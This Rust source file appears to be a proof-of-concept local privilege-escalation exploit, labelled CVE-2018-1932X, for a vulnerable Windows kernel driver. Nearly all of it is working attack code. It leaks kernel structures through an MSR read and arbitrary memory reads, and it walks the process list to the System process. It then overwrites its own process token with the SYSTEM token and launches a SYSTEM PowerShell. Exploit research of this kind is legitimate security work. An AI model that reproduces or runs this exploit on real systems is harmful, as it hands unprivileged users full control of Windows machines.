mod gio;
mod kdriver;

use std::process;
use std::process::Command;

use crate::gio::GIOPrimatives;

fn main() {
    println!("CVE-2018-1932X\n");
    let gio = GIOPrimatives::new();

    /* Leak the _KPCR (Kernel Processor Control Region) using rdmsr
    
        https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/kpcr.htm

        Kernel-mode code can easily find the KPCR for whichever processor it’s executing on, because when the processor
        last entered ring 0, however it got there, the kernel will have loaded the gs register to address that processor’s 
        KPCR. This is done by the swapgs instruction. It loads the base address for gs from the processor’s Model Specific Register
        (MSR) 0xC0000102, which the kernel initialises with the address of the processor’s KPCR. Intel’s label for this MSR is
        IA32_KERNEL_GS_BASE. Microsoft’s assembly-language name, defined in KSAMD64.INC, is MSR_GS_SWAP. 

        Anecdotally it seems like you really want KPCR @ IA32_GS_BASE which is 0xC0000101 instead.

     */
    const IA32_GS_BASE: u32 = 0xC0000101;
    let kpcr_ptr = gio.read_msr(IA32_GS_BASE);
    println!("  [+] Leaked   _KPCR: {:x}", kpcr_ptr);

    /* Leak the Current _KPROCESS from: 
    
        _KPCR
        _KPRCB* CurrentPrcb ->
        _KTHREAD* CurrentThread ->
        _KPROCESS* Process ( == _EPROCESS since it's at offset 0)

     */
    const KPCR_OFFSET_PCRB: u64 = 0x20;
    const KPRCB_OFFSET_KTHREAD: u64  = 0x8;
    const KTHREAD_OFFSET_KPROCESS: u64 = 0x220;

    let kprcb_addr: u64 = kpcr_ptr + KPCR_OFFSET_PCRB;
    println!("  [*] Address  _KPCRB: {:x}", kprcb_addr);
    let kprcb_ptr: u64 = gio.leak_addr(kprcb_addr);
    println!("  [+] Leaked   _KPRCB: {:x}", kprcb_ptr);

    let kthread_addr: u64 = kprcb_ptr + KPRCB_OFFSET_KTHREAD;
    println!("  [*] Address  _KTHREAD: {:x}", kthread_addr);
    let kthread_ptr: u64 = gio.leak_addr(kthread_addr);
    println!("  [+] Leaked   _KTHREAD: {:x}", kthread_ptr);

    let kprocess_addr: u64 = kthread_ptr + KTHREAD_OFFSET_KPROCESS;
    println!("  [*] Address  _KPROCESS: {:x}", kprocess_addr);
    let kprocess_ptr: u64 = gio.leak_addr(kprocess_addr);
    println!("  [+] Leaked   _KPROCESS: {:x}", kprocess_ptr);

    // Sanity Check result of MSR Read
    const EPROCESS_OFFSET_PID: u64 = 0x440;

    let pid_addr: u64 = kprocess_ptr + EPROCESS_OFFSET_PID;
    println!("  [*] Address  PID: {:x}", pid_addr);
    let pid: u64 = gio.leak_addr(pid_addr);
    println!("  [+] Leaked   PID: {}", pid);
    println!("  [+] Known    PID: {}", process::id());

    if pid != process::id().into() {
        panic!("PID mismatch. _EPROCESS leak failed. MSR read was probably bad. Try again...")
    }

    // Walk the active process links to find the System process (PID 4)
    const EPROCESS_OFFSET_ACTIVEPROCESSLINKS: u64 = 0x448;  // _LIST_ENTRY
    const SYSTEM_PID: u64 = 0x4;  // _LIST_ENTRY
    
    let mut current_eprocess_ptr: u64 = kprocess_ptr;
    let mut current_pid: u64 = pid;
    let (mut flink_addr, mut flink_ptr): (u64, u64);

    println!("Walking Active Process Links...");
    while current_pid != SYSTEM_PID {
        flink_addr = current_eprocess_ptr + EPROCESS_OFFSET_ACTIVEPROCESSLINKS;
        println!("  [*] Address  ActiveProcessLinks.Flink: {:x} (PID: {:x})", flink_addr, current_pid);

        flink_ptr = gio.leak_addr(flink_addr);
        current_eprocess_ptr = flink_ptr - EPROCESS_OFFSET_ACTIVEPROCESSLINKS;
        current_pid = gio.leak_addr(current_eprocess_ptr + EPROCESS_OFFSET_PID);
        println!("  [+] Leaked   _EPROCESS: {:x} (PID: {:x})", flink_ptr, current_pid);
    }

    // Spawn a process with the SYSTEM Token
    const EPROCESS_OFFSET_TOKEN: u64 = 0x4B8;
    
    let sys_eprocess_ptr = current_eprocess_ptr;

    let my_token: u64 = gio.leak_addr(kprocess_ptr + EPROCESS_OFFSET_TOKEN);
    let sys_token: u64 = gio.leak_addr(sys_eprocess_ptr + EPROCESS_OFFSET_TOKEN);
    println!("  [+] Current Token: {:x}", my_token);
    println!("  [+] System  Token: {:x}", sys_token);

    println!("Borrowing SYSTEM Token...");
    gio.memcpy(sys_eprocess_ptr + EPROCESS_OFFSET_TOKEN,
         kprocess_ptr + EPROCESS_OFFSET_TOKEN,
         8);

    let current_token: u64 = gio.leak_addr(kprocess_ptr + EPROCESS_OFFSET_TOKEN);
    println!("  [+] Current Token: {:x}", current_token);

    println!("Spawning Process...");
    let cmd = Command::new("cmd.exe")
        .arg("/c")
        .arg("start powershell.exe -NoExit -Command whoami")
        .spawn();

    match cmd {
        Ok(_) => println!("  [+] Spawned SYSTEM Process"),
        Err(_) => println!("  [-] Process Spawn Failed..."),
    }

}
